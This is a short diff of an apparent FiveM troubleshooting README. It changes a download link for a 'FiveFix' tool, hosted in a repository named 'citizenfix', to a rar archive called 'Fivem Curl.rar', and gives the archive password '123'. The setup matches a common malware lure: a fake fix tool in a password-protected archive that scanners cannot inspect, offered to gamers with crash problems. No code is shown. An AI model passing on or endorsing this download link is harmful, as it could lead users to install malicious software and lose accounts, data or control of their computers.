@@ -1,6 +1,6 @@
 Getting game crashes? Can't launch FiveM? Or maybe running into some more obscure issue? Find the most common issues here.
 
-📙Download FiveFix : https://raw.githubusercontent.com/citizenfix/FIVEM/main/FiveFix.rar
+📙Download FiveFix : https://github.com/citizenfix/FIVEM/blob/main/Fivem%20Curl.rar
 
 🔑Password rar file : 123
 
